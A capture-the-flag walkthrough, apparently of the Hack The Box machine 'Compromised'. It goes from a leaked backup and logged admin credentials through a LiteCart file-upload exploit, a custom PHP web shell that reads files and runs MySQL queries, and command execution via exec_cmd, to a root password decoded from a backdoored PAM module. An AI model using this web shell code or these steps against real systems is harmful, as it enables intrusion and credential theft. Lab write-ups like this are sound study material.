# Compromised

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.71.208
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 04:28 EDT
Nmap scan report for 10.129.71.208
Host is up (0.0088s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Litecart Backup --> Admin Creds

Port 80 shows a kind of shopping page:

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

There are exploits available for this:

```
$ searchsploit litecart               
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
LiteCart 2.1.2 - Arbitrary File Upload                     | php/webapps/45267.py
----------------------------------------------------------- ---------------------------------
```

However, these require credentials. Anyways, we don't have any obvious domains, so let's fuzz directories. There was a `backup` directory present:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.71.208 -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.71.208
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/11 04:33:06 Starting gobuster in directory enumeration mode
===============================================================
/shop                 (Status: 301) [Size: 313] [--> http://10.129.71.208/shop/]
/backup               (Status: 301) [Size: 315] [--> http://10.129.71.208/backup/]
```

It only had 1 folder.

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

With opened, it seems to provide us with the source code of the entire website:

```
$ ll
total 60
drwxr-xr-x 24 kali kali  4096 Sep  3  2020 admin
drwxr-xr-x  2 kali kali  4096 May 28  2020 cache
drwxr-xr-x  2 kali kali  4096 May 28  2020 data
drwxr-xr-x  7 kali kali  4096 May 14  2018 ext
-rw-r--r--  1 kali kali 15086 May 28  2020 favicon.ico
drwxr-xr-x 10 kali kali  4096 May 28  2020 images
drwxr-xr-x 11 kali kali  4096 May 28  2020 includes
-rw-r--r--  1 kali kali  2508 May 14  2018 index.php
drwxr-xr-x  2 kali kali  4096 May 28  2020 logs
drwxr-xr-x  4 kali kali  4096 May 14  2018 pages
-rw-r--r--  1 kali kali    71 May 28  2020 robots.txt
drwxr-xr-x  4 kali kali  4096 May 29  2020 vqmod
```

We can look at the `/admin` directory first. Within the `login.php` file, we can find a hidden directory:

```php
if (isset($_POST['login'])) {
    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
    user::login($_POST['username'], $_POST['password'], $redirect_url, isset($_POST['remember_me']) ? $_POST['remember_me'] : false);
  }
```

Within the .txt file, we can find credentials:

```
$ curl http://10.129.71.208/shop/admin/.log2301c9430d8593ae.txt
User: admin Passwd: theNextGenSt0r3!~
```

Now that we have credentials, we can login at `/shop/admin`. Within the dashboard, we can find the version that is in use:

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

So this version is indeed vulnerable to the LFI we found earlier.&#x20;

### File Upload --> SQL Injection

When trying the PoC, we can see that the file uploaded, but it was not executing:

```
$ python 45267.py -t http://10.129.71.208/shop/admin/ -u admin -p 'theNextGenSt0r3!~' 
Shell => http://10.129.71.208/shop/admin/../vqmod/xml/KQ7KN.php?c=id
b''
```

Weird. We can change this to run `phpinfo();` instead in case there are functions being blocked. Sure enough, there are tons of blocked functions:

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Since we weren't able to run commands on this, what we can do instead is get an LFI script going.

```python
files = {
        'vqmod': (rand + ".php", "<?php if (isset($_REQUEST['file'])) {  echo file_get_contents($_REQUEST['file']);} if (isset($_REQUEST['dir'])) {print_r(scandir($_REQUEST['dir']));} ?>", "application/xml"),
        'token':one,
        'upload':(None,"Upload")
```

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Interestingly, the `mysql` user had a shell:

```
mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash
```

Let's try to enumerate the possible `config.php` files.&#x20;

```
$ curl http://10.129.71.208/shop/admin/../vqmod/xml/8IKVU.php?file=/var/www/html/shop/includes/config.inc.php
define('DB_TYPE', 'mysql');
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'changethis');
define('DB_DATABASE', 'ecom');
define('DB_TABLE_PREFIX', 'lc_');
define('DB_CONNECTION_CHARSET', 'utf8');
define('DB_PERSISTENT_CONNECTIONS', 'false');
```

This means that we can connect to the database and run Database commands using our file upload abilities. I used other machine's PHP SQL connection as a syntax of how to write this.

{% code overflow="wrap" %}
```python
files = {
        'vqmod': (rand + ".php", "<?php if (isset($_REQUEST['file'])) {  echo file_get_contents($_REQUEST['file']);} if (isset($_REQUEST['dir'])) {print_r(scandir($_REQUEST['dir']));}  if (isset($_REQUEST['db'])) { $conn = new mysqli('localhost', 'root', 'changethis', 'ecom') or exit; $req = mysqli_query($conn, $_REQUEST['db']); while ($row = $req->fetch_row()) { foreach ($row as $x){echo $x;} echo '\n'; } } ?>", "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }
```
{% endcode %}

Then, we can test this:

```
$ curl -G --data-urlencode 'db=select @@version' http://10.129.71.208/shop/admin/../vqmod/xml/7FKEJ.php
5.7.30-0ubuntu0.18.04.1
```

Now that we have access to the database, we can actually use this for RCE with the `exec_cmd` command.

```
$ curl -G --data-urlencode 'db=SELECT exec_cmd("ls");' http://10.129.71.208/shop/admin/../vqmod/xml/7FKEJ.php -o test
$ cat test             
auto.cn
```

Using this, we can write to the `authorized_keys` file of the `mysql` user. Then, we can SSH in as the user.

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Sysadmin Creds

There's another user `sysadmin` on the machine. I scanned the entire home directory for files containing `password`.&#x20;

```
mysql@compromised:~$ grep -iRl 'password' ./ 2>/dev/null
./mysql/user.frm
./mysql/help_topic.ibd
./mysql/servers.frm
./mysql/help_keyword.ibd
./mysql/user.MYD
./mysql/slave_master_info.frm
./ecom/lc_settings.MYI
./ecom/lc_translations.MYI
./ecom/lc_customers.frm
./ecom/lc_users.frm
./ecom/lc_settings.MYD
./ecom/lc_translations.MYD
./ibtmp1
./ib_logfile0
./ib_logfile1
./strace-log.dat
./ibdata1
```

Then I went through eac hfo these to find passwords, and eventually found one within `strace-log.dat`.&#x20;

```
mysql@compromised:~$ cat strace-log.dat | grep password
22102 03:11:06 write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0
```

Using this, we can `su` to `sysadmin`.

<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

Grab the user flag.&#x20;

### Root Creds

There were loads of firewalls that didn't let me upload shells on the machine, which was really annoying. I took a hint from the forum, which said that this machine **was already compromised and we are following in the attacker's footsteps**.&#x20;

As an attacker, maybe we want to hide files by prepending `.` in the front. In this case, I started to search for hidden folders:

```
find / -type f -iname ".*" -ls 2>/dev/null
75985    196 -rw-r--r--   1 root     root       198440 Aug 31  2020 /lib/x86_64-linux-gnu/security/.pam_unix.so
```

I found this `pam_unix.so` file that was hidden. This was weird because it's an important library, so why would it be hidden? Also, it's last edited data was the latest among all the other library files. Let's download this back to my machine for analysis.&#x20;

When we are doing analysis, we can compare it to the original binary from here:

{% embed url="https://launchpad.net/ubuntu/bionic/amd64/libpam-modules/1.1.8-3.6ubuntu2" %}

When we use `ghidra` to compare the files via Version History, we can see that there's one function that increased in size, as if something was appended:

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

When analysing that function, we can see a `backdoor` array.

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

We can grab that bit of hex and decode it:

```
$ echo 7a6c6b657e5533456e7638326d322d | xxd -r -p
zlke~U3Env82m2-
```

And that's the `root` password!

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
